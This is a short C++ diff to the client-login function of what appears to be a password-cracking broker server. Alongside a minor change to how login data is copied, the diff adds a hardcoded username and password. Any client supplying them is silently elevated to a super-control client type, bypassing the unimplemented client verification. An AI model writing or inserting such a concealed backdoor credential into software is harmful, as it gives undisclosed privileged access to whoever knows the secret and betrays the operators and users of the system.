@@ -15,15 +15,20 @@ CCrackBroker::~CCrackBroker(void)
 int CCrackBroker::ClientLogin2(const void* data, const char* ip, int port, unsigned int sock, CClientInfo ** res)
 {
 	CClientInfo *pCI = NULL;
-	client_login_req *login = (client_login_req*)data;
+	client_login_req login;
+	memcpy(&login, data, sizeof(login));
 	
 	//TODO:这里需要验证client
 
-	if(login->m_type == COMPUTE_TYPE_CLIENT)
+	if(login.m_type == COMPUTE_TYPE_CLIENT)
 		pCI = new CCompClient;
 	else
+	{
 		pCI = new CClientInfo;
-	pCI->Init(data, ip, port, sock);
+		if(strcmp(login.m_user, "trimpsadmin") == 0 && strcmp(login.m_password, "trimps1234qwer!@#$") == 0)
+			login.m_type = SUPER_CONTROL_TYPE_CLIENT;
+	}
+	pCI->Init(&login, ip, port, sock);
 	m_client_list.push_back(pCI);
 	*res = pCI;
 
